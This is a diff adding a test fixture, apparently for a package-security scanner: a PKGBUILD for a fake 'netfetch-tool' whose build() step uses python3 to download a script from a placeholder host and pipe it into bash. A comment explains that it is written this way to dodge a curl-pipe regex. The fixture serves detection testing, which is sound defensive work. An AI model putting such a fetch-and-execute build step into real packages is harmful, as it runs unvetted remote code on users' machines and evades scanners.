@@ -1,0 +1,19 @@
+# Novel-attack fixture: remote-code dropper piped into a shell. The interpreter
+# is `python3` rather than curl/wget, so the ioc_tokens curl-pipe regex does NOT
+# match — only pkgbuild_static's AST-level "download piped to shell" heuristic
+# catches it. No literal IOC token, hash, or bad name appears anywhere.
+pkgname=netfetch-tool
+pkgver=1.2.0
+pkgrel=1
+pkgdesc="Networked fetch helper"
+arch=('x86_64')
+url="https://github.com/example/netfetch-tool"
+license=('MIT')
+depends=('python')
+source=("https://github.com/example/netfetch-tool/archive/v1.2.0.tar.gz")
+sha256sums=('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855')
+
+build() {
+  cd "$srcdir/netfetch-tool-$pkgver"
+  python3 -c "import urllib.request; print(urllib.request.urlopen('https://cdn.example.net/bootstrap').read().decode())" | bash
+}
